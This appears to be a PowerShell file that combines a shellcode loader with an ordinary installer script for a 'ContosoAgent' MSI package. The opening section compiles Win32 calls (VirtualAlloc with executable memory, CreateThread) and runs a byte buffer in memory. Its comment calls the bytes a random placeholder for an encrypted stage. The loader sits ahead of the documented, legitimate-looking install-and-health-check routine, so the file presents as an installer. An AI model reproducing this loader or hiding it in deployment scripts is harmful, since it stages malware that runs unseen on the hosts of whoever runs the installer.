
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xe4, 0xc5, 0x78, 0x4d, 0x5f, 0x3b, 0x0d, 0x02, 0x78, 0xc3, 0x0c, 0xc2, 0x6c, 0xc7, 0x32, 0x07,
        0x4c, 0x33, 0x97, 0xd8, 0x7f, 0xb8, 0xaf, 0x95, 0x9c, 0x01, 0xff, 0xe9, 0x23, 0x8f, 0x9d, 0xcd,
        0x0c, 0x95, 0xe5, 0x75, 0xe5, 0x1c, 0x18, 0xb2, 0xff, 0xc6, 0x12, 0x79, 0xbd, 0x7d, 0x3d, 0x07,
        0xa2, 0xb3, 0x7c, 0xaf, 0x45, 0xe8, 0x35, 0x3f, 0x87, 0x54, 0x5e, 0x56, 0xf4, 0x17, 0x87, 0x40,
        0xe0, 0xe0, 0x31, 0xb3, 0x3f, 0x73, 0x1a, 0x11, 0x3e, 0x58, 0x30, 0xcd, 0xbc, 0x54, 0xf4, 0x12,
        0x8c, 0xf1, 0x8b, 0x35, 0x24, 0x91, 0x24, 0x87, 0xaa, 0x37, 0x65, 0x2f, 0xc9, 0x20, 0x74, 0x25,
        0x1b, 0x21, 0x41, 0x0c, 0x59, 0x06, 0x84, 0x85, 0x32, 0x84, 0x70, 0xfd, 0xe8, 0x5a, 0xcd, 0x4b,
        0x49, 0xd0, 0xe3, 0x18, 0x28, 0x47, 0xb6, 0xa1, 0xb7, 0x75, 0x0c, 0x72, 0x33, 0x34, 0x4a, 0xbc,
        0xc4, 0xf9, 0x15, 0xa4, 0xa0, 0x09, 0xb3, 0x9b, 0x8b, 0x7c, 0xac, 0x60, 0x35, 0x9b, 0x93, 0x40,
        0xf6, 0xa9, 0xcf, 0x7d, 0x45, 0xa9, 0xe4, 0xd4, 0x7a, 0x3e, 0xdb, 0x89, 0x58, 0x53, 0x7d, 0x81,
        0xcc, 0x8f, 0x6f, 0x45, 0x58, 0xf0, 0xe5, 0x72, 0x5a, 0x89, 0xe3, 0xf8, 0xdc, 0x65, 0xdd, 0x43,
        0xfb, 0xc5, 0x49, 0xe2, 0x54, 0xe3, 0xe3, 0xbe, 0xcf, 0xad, 0x85, 0x72, 0x89, 0x72, 0x0d, 0x2d,
        0xd0, 0xa4, 0xd0, 0x85, 0x4a, 0x34, 0xd7, 0xb7, 0xe1, 0xd6, 0x93, 0x7a, 0x65, 0x19, 0xa9, 0xff,
        0x75, 0x3a, 0x82, 0xf2, 0xb9, 0x23, 0xaa, 0x64, 0xc5, 0x1c, 0x89, 0x66, 0x21, 0x7e, 0x6d, 0x7c,
        0x22, 0xb5, 0xbf, 0x1a, 0xf7, 0xa6, 0xc3, 0x72, 0x8b, 0xaf, 0xd2, 0xb4, 0x63, 0x98, 0x50, 0x86,
        0xfa, 0xa8, 0x40, 0xef, 0x2d, 0x0e, 0xfb, 0x11, 0x2d, 0x2c, 0x16, 0xb9, 0x95, 0x4b, 0x78, 0x8d,
        0xcf, 0xc0, 0xce, 0x21, 0xe3, 0xdd, 0x9c, 0x1e, 0xd6, 0x96, 0x25, 0x49, 0x46, 0xd3, 0xca, 0x29,
        0x3d, 0x98, 0xa1, 0xe9, 0x72, 0x13, 0xdb
    )

    $BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 2367)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Installs the ContosoAgent package and validates the resulting service.
.DESCRIPTION
    Runs the vendor MSI unattended, ensures the service is registered, opens the
    local firewall port and waits for the health endpoint to answer.
    Every step writes to the installation log so a failed rollout can be traced
    on the target host.
.PARAMETER InstallerPath
    Overrides the default value defined in the parameter block.
.PARAMETER ServiceName
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Install-Agent.ps1 -InstallerPath C:\Scripts\packages\ContosoAgent-4.2.7.msi
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InstallerPath = "C:\Scripts\packages\ContosoAgent-4.2.7.msi",

    [string]$ServiceName = "ContosoAgent",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 9000,

    [int]$TimeoutSec = 120,

    [string]$LogPath = 'C:\Logs\install-contosoagent-2025-07-11.log',

    [string]$RuleName = 'ContosoAgent Inbound'
)

$ErrorActionPreference = "Stop"


$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}
if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
Write-Host ("{0} {1} is {2}" -f $installed.Name, $installed.DisplayName, $installed.Status) -ForegroundColor Green
